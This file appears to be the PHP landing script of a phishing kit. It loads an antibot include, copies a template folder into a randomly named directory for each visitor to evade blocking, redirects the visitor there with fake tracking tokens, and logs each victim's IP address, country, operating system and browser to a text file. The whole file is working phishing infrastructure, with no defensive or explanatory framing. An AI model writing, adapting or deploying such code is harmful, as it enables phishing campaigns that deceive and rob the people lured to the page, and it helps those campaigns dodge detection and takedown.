<?php

include 'antibot-private.php';
include 'inc/app.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country();
$get_user_countrycode = get_user_countrycode();
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$dispatch = substr(md5($random), 0, 17);
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            } else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$home="404";
recurse_copy( $home, $DIR );
header("location:$DIR/index.php?forceReload=937d4738cec326a9204a074b7868f9f4937d4738cec326a9204a074b7868f9f4937d4738cec326a9204a074b7868f9f4&p=1&dispatch=a11fe7216d54e586c0773e0fa17aba4eb2c54f8c");
$file = fopen("vu.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

?>
    